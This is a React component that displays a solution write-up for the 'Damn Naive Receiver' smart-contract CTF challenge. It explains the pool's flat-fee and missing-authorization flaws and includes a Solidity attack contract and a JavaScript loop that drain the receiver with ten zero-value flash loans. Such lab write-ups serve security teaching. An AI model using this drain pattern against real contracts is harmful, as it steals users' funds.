import React from 'react';
import { Accordion, Card, Badge } from 'react-bootstrap';
import { Lock, ChevronDown, AlertTriangle, Target, BookText, Zap, Code } from 'lucide-react';

const DamnNaiveReceiver = () => {
  return (
    <div className="mb-4">
      <h3 className="d-flex align-items-center gap-2 mb-3">
        <Lock size={20} className="text-muted" />
        Damn Naive Receiver CTF Challenge
      </h3>
      
      <Accordion defaultActiveKey="0">
        <Card>
          <Accordion.Header as={Card.Header} className="d-flex justify-content-between align-items-center">
            <div className="d-flex align-items-center gap-2">
              <AlertTriangle size={18} className="text-warning" />
              <strong>View Challenge Solution</strong>
            </div>
            <ChevronDown size={18} />
          </Accordion.Header>
          <Accordion.Body>
            <Card.Body>
              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Target size={18} />
                  Challenge Goal
                </h5>
                <p>Drain all 10 ETH from a receiver contract (which interacts with a lending pool), without being its owner.</p>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <BookText size={18} />
                  Contract Setup
                </h5>
                <h6>🏦 Naive Lending Pool Contract</h6>
                <ul>
                  <li>Holds 1000 ETH</li>
                  <li>Offers flash loans</li>
                  <li>Charges a flat fee of 1 ETH per loan</li>
                </ul>
                <pre className="bg-light p-2 rounded">
{`require(
    address(this).balance >= balanceBefore + FIXED_FEE,
    "Flash loan hasn't been paid back"
);`}
                </pre>

                <h6 className="mt-3">👤 Receiver Contract</h6>
                <ul>
                  <li>Has 10 ETH balance</li>
                  <li>Automatically repays loan + fee</li>
                  <li>Doesn't validate loan initiator</li>
                </ul>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <AlertTriangle size={18} className="text-danger" />
                  Core Vulnerabilities
                </h5>
                <h6>📉 1. Flat Fee Model</h6>
                <p>Every flash loan costs 1 ETH, even for 0 ETH loans</p>

                <h6 className="mt-3">🧨 2. No Authorization</h6>
                <p>Anyone can initiate flash loans on behalf of the receiver</p>
              </div>

              <div className="mb-4">
                <h5 className="d-flex align-items-center gap-2">
                  <Zap size={18} className="text-primary" />
                  Exploit Strategy
                </h5>
                <p>Call flash loan 10 times with 0 ETH amount:</p>
                <pre className="bg-light p-2 rounded">
{`naivePool.flashLoan(address(receiver), 0);`}
                </pre>
                <p>Each call triggers:</p>
                <pre className="bg-light p-2 rounded">
{`function receiveEther(uint256 fee) external payable {
    uint256 amountToBeRepaid = msg.value + fee;
    require(msg.sender == pool);
    pool.sendEtherBack{value: amountToBeRepaid}();
}`}
                </pre>
                <ul>
                  <li>msg.value = 0, fee = 1 ETH</li>
                  <li>Receiver sends 1 ETH back to pool</li>
                  <li>Repeat 10 times to drain all ETH</li>
                </ul>
              </div>

              <div>
                <h5 className="d-flex align-items-center gap-2">
                  <Code size={18} />
                  Exploit Contract
                </h5>
                <pre className="bg-light p-3 rounded">
{`contract AttackNaiveReceiver {
    NaiveReceiverLenderPool public pool;
    address public victim;

    constructor(address _pool, address _victim) {
        pool = NaiveReceiverLenderPool(_pool);
        victim = _victim;
    }

    function attack() external {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(victim, 0); // Drain 1 ETH per call
        }
    }
}`}
                </pre>
                <p className="mt-2">Test script alternative:</p>
                <pre className="bg-light p-2 rounded">
{`for (let i = 0; i < 10; i++) {
  await pool.flashLoan(receiver.address, 0);
}`}
                </pre>
              </div>
            </Card.Body>
          </Accordion.Body>
        </Card>
      </Accordion>
    </div>
  );
};

export default DamnNaiveReceiver;